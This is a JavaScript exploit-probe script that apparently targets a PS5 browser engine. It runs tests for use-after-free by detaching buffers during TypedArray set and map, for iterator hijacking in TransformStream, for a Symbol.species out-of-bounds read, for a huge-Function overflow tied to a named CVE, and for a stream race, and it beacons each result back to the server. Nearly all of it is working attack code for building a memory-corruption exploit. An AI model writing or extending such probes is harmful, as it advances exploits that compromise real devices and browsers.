// p124 — Alternative exploit vectors
// Sort-detach UAF is DEAD (safe getter returns undefined, no stale pointer access)
// Pivoting to: set() valueOf detach, iterator re-entrancy, CVE feasibility
//
// R1: SET-DETACH — ta.set(array) with valueOf that detaches, check via transferred buffer
// R2: MAP-DETACH — ta.map(fn) where fn detaches, check return array
// R3: ITER-TRACE — what arrays does TransformStream iterate via Symbol.iterator?
// R4: ITER-INJECT — inject controlled objects/values via patched iterator
// R5: DATALIST — <datalist> feature detection for CVE-2026-64783
// R6: BIGFUNC — large Function() for UnlinkedMetadataTable overflow feasibility
// R7: SPECIES — Symbol.species override on ArrayBuffer during slice
// R8: PROTO-CONFUSION — __proto__ manipulation during stream construction
(function(){
var rid='v124r'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V124R-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V124R-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe124-start');
var sleep=function(ms){return new Promise(function(r){setTimeout(r,ms);});};
function withTimeout(fn,ms){
  return Promise.race([fn(),new Promise(function(_,rej){setTimeout(function(){rej(new Error('TIMEOUT_'+(ms||10000)+'ms'));},ms||10000);})]);
}
var tests=[];
function addTest(n,fn){tests.push({name:n,fn:fn});}

// R1: SET-DETACH — ta.set() with valueOf callback that detaches the buffer
// Key question: does .set() use raw pointer for writes (UAF!) or safe setter (drops)?
addTest('R1-SET-DETACH',function(){
  return withTimeout(async function(){
    var r={};
    var SIZE=1024;
    var ab=new ArrayBuffer(SIZE);
    var ta=new Uint8Array(ab);
    ta.fill(0x00);
    var mc=new MessageChannel();
    var detached=false,detachIdx=100,callCount=0;

    var source=[];
    for(var i=0;i<SIZE;i++){
      if(i===detachIdx){
        source.push({valueOf:function(){
          if(!detached){
            mc.port1.postMessage(ab,[ab]);
            detached=true;
            r.abLenAtDetach=ab.byteLength;
          }
          callCount++;
          return 0x41;
        }});
      } else {
        source.push(0x41);
      }
    }

    try{ta.set(source);r.setOK=true;}
    catch(e){r.setErr=e.constructor.name+':'+String(e.message||'').slice(0,80);}
    r.detached=detached;
    r.callCount=callCount;

    try{
      var received=await new Promise(function(res,rej){
        var t=setTimeout(function(){rej(new Error('PORT_TIMEOUT'));},3000);
        mc.port2.onmessage=function(e){clearTimeout(t);res(e.data);};
      });
      if(received instanceof ArrayBuffer){
        var rv=new Uint8Array(received);
        r.rcvLen=received.byteLength;
        var preOK=0,postWritten=0,postZero=0;
        for(var j=0;j<detachIdx;j++){if(rv[j]===0x41)preOK++;}
        r.preDetachWritten=preOK;
        r.detachIdxVal=rv[detachIdx];
        for(var k=detachIdx+1;k<SIZE;k++){
          if(rv[k]===0x41)postWritten++;
          else if(rv[k]===0x00)postZero++;
        }
        r.postWritten=postWritten;
        r.postZero=postZero;
        r.UAF=postWritten>0?'SET_WRITES_AFTER_DETACH':'SAFE';
      }
    }catch(e){r.rcvErr=e.constructor.name+':'+String(e.message||'').slice(0,60);}
    return r;
  },8000);
});

// R2: MAP-DETACH — ta.map() with callback that detaches, check result
addTest('R2-MAP-DETACH',function(){
  return withTimeout(async function(){
    var r={};
    var SIZE=256;
    var ab=new ArrayBuffer(SIZE);
    var ta=new Uint8Array(ab);
    for(var i=0;i<SIZE;i++) ta[i]=i;
    var calls=0,detached=false;
    var result;
    try{
      result=ta.map(function(val,idx){
        calls++;
        if(idx===50&&!detached){
          var mc=new MessageChannel();
          mc.port1.postMessage(null,[ab]);
          detached=true;
          r.abLenAtDetach=ab.byteLength;
        }
        return val*2;
      });
      r.mapOK=true;
      r.resultLen=result.length;
      r.resultType=result.constructor.name;
      var nonZero=0,samples=[];
      for(var j=51;j<SIZE;j++){
        if(result[j]!==0){nonZero++;if(samples.length<20) samples.push({i:j,v:result[j]});}
      }
      r.postDetachNonZero=nonZero;
      r.samples=samples;
    }catch(e){r.mapErr=e.constructor.name+':'+String(e.message||'').slice(0,80);}
    r.calls=calls;
    r.detached=detached;
    return r;
  },5000);
});

// R3: ITER-TRACE — trace arrays iterated by TransformStream via Symbol.iterator
addTest('R3-ITER-TRACE',function(){
  return withTimeout(async function(){
    var r={traces:[]};
    var origIter=Array.prototype[Symbol.iterator];
    try{
      Array.prototype[Symbol.iterator]=function(){
        var arr=this;
        var snapshot;
        try{snapshot=JSON.stringify(arr).slice(0,200);}catch(e){snapshot='[err]';}
        r.traces.push({
          len:arr.length,
          ctorName:arr.constructor.name,
          content:snapshot,
          stack:new Error().stack.split('\n').slice(1,4).join('|').slice(0,200)
        });
        return origIter.call(this);
      };
      var ts=new TransformStream();
      r.tsOK=true;
    }catch(e){r.tsErr=e.constructor.name+':'+String(e.message||'').slice(0,80);}
    finally{Array.prototype[Symbol.iterator]=origIter;}
    return r;
  },5000);
});

// R4: ITER-INJECT — return controlled values from iterator during TransformStream
addTest('R4-ITER-INJECT',function(){
  return withTimeout(async function(){
    var r={};
    var origIter=Array.prototype[Symbol.iterator];
    var callNum=0;
    var injected=false;
    try{
      Array.prototype[Symbol.iterator]=function(){
        callNum++;
        if(callNum===1){
          injected=true;
          var idx=0;
          var fakeVals=[
            {highWaterMark:999,size:function(){return 1;}},
            {highWaterMark:888,size:function(){return 1;}},
            {type:'bytes',autoAllocateChunkSize:65536}
          ];
          return {
            next:function(){
              if(idx<fakeVals.length) return {value:fakeVals[idx++],done:false};
              return {value:undefined,done:true};
            }
          };
        }
        return origIter.call(this);
      };
      try{
        var ts=new TransformStream();
        r.tsOK=true;
        r.readable=ts.readable!==undefined;
        r.writable=ts.writable!==undefined;
      }catch(e){
        r.tsErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
      }
    }catch(e){r.err=e.constructor.name;}
    finally{Array.prototype[Symbol.iterator]=origIter;}
    r.callNum=callNum;
    r.injected=injected;
    return r;
  },5000);
});

// R5: DATALIST — feature detection for CVE-2026-64783
addTest('R5-DATALIST',function(){
  return withTimeout(async function(){
    var r={};
    r.htmlDatalistElement=typeof HTMLDataListElement!=='undefined';
    try{
      var dl=document.createElement('datalist');
      r.tagName=dl.tagName;
      r.dlToString=dl.toString().slice(0,60);
      var input=document.createElement('input');
      input.setAttribute('list','test-dl');
      dl.id='test-dl';
      document.body.appendChild(dl);
      document.body.appendChild(input);
      r.inputList=input.list!==null;
      r.inputListTag=input.list?input.list.tagName:'null';
      var opt=document.createElement('option');
      opt.value='testval';
      dl.appendChild(opt);
      r.optionsLen=dl.options?dl.options.length:-1;
      document.body.removeChild(input);
      document.body.removeChild(dl);
      r.supported=true;
    }catch(e){
      r.supported=false;
      r.dlErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }
    // Check DataListButtonElement specifically
    r.dataListButtonElement=typeof window.DataListButtonElement!=='undefined';
    return r;
  },3000);
});

// R6: BIGFUNC — test large Function() for UnlinkedMetadataTable overflow
// CVE-2026-64784: 'a();'.repeat(44739242) ≈ 180MB source
// Test progressively smaller sizes first to find PS5 memory limit
addTest('R6-BIGFUNC',function(){
  return withTimeout(async function(){
    var r={tests:[]};
    var sizes=[1000000,5000000,10000000,20000000];
    for(var si=0;si<sizes.length;si++){
      var n=sizes[si];
      var t={n:n,bytes:n*4};
      try{
        var src='a();'.repeat(n);
        t.srcLen=src.length;
        try{
          var fn=new Function('a',src);
          t.ok=true;
          t.fnType=typeof fn;
          fn=null;
        }catch(e){
          t.fnErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
        }
        src=null;
      }catch(e){
        t.srcErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
      }
      r.tests.push(t);
      // GC between tests
      for(var g=0;g<10;g++){var tmp=new ArrayBuffer(1048576);tmp=null;}
    }
    return r;
  },30000);
});

// R7: SPECIES — Symbol.species on ArrayBuffer during TypedArray.slice()
// If we override @@species, slice() creates a different buffer type
addTest('R7-SPECIES',function(){
  return withTimeout(async function(){
    var r={};
    try{
      var ab=new ArrayBuffer(1024);
      var ta=new Uint8Array(ab);
      for(var i=0;i<1024;i++) ta[i]=i&0xFF;

      // Override species to return a smaller buffer
      var speciesCalled=false;
      var origSpecies=Object.getOwnPropertyDescriptor(ArrayBuffer,Symbol.species);
      Object.defineProperty(ArrayBuffer,Symbol.species,{
        get:function(){
          speciesCalled=true;
          return function(len){
            r.requestedLen=len;
            return new ArrayBuffer(64); // much smaller!
          };
        },configurable:true
      });

      try{
        var sliced=ta.slice(0,512);
        r.sliceOK=true;
        r.slicedLen=sliced.length;
        r.slicedBufLen=sliced.buffer.byteLength;
        r.speciesCalled=speciesCalled;
        if(sliced.buffer.byteLength<512){
          r.OOB='SPECIES_UNDERSIZED_BUFFER';
          var check=new Uint8Array(sliced.buffer);
          var leaked=[];
          for(var j=0;j<Math.min(check.length,20);j++) leaked.push(check[j]);
          r.leakedBytes=leaked;
        }
      }catch(e){
        r.sliceErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
      }
      if(origSpecies) Object.defineProperty(ArrayBuffer,Symbol.species,origSpecies);
      else delete ArrayBuffer[Symbol.species];
    }catch(e){r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);}
    return r;
  },5000);
});

// R8: PROMISE-RACE-RESOLVE — Can we race a stream cancel with a controller action
// to create an inconsistent internal state?
addTest('R8-RACE-STATE',function(){
  return withTimeout(async function(){
    var r={};
    var ctrl;
    var pullCount=0;
    var rs=new ReadableStream({
      start:function(c){ctrl=c;},
      pull:function(c){
        pullCount++;
        if(pullCount<=3) c.enqueue(new Uint8Array([pullCount]));
      }
    });
    var branches=rs.tee();
    var r1=branches[0].getReader();
    var r2=branches[1].getReader();
    // Read one from each to start pulls
    await r1.read();
    await r2.read();
    // Now race: cancel branch0 while enqueueing through controller
    var cancelP=branches[0].cancel('race');
    // Immediately try to enqueue through controller (should be locked by tee)
    try{ctrl.enqueue(new Uint8Array([99]));r.enqueueOK=true;}
    catch(e){r.enqueueErr=e.constructor.name+':'+String(e.message||'').slice(0,40);}
    try{ctrl.close();r.closeOK=true;}
    catch(e){r.closeErr=e.constructor.name+':'+String(e.message||'').slice(0,40);}
    // Check cancel settled
    try{
      var cr=await Promise.race([cancelP.then(function(){return'ok';}),
        new Promise(function(r){setTimeout(function(){r('pending');},500);})]);
      r.cancelResult=cr;
    }catch(e){r.cancelErr=e.constructor.name;}
    // Read remaining from branch1
    try{
      var v=await r2.read();
      r.b1Read={done:v.done,len:v.value?v.value.length:0};
    }catch(e){r.b1ReadErr=e.constructor.name;}
    r.pullCount=pullCount;
    return r;
  },5000);
});

async function runAll(){
  for(var t=0;t<tests.length;t++){
    var test=tests[t];
    try{
      var result=await test.fn();
      beacon(test.name,result);
    }catch(e){
      beacon(test.name,{error:e.constructor.name+':'+String(e.message||'').slice(0,100)});
    }
    await sleep(300);
  }
  beacon('DONE','all-'+tests.length);
}
runAll();
})();
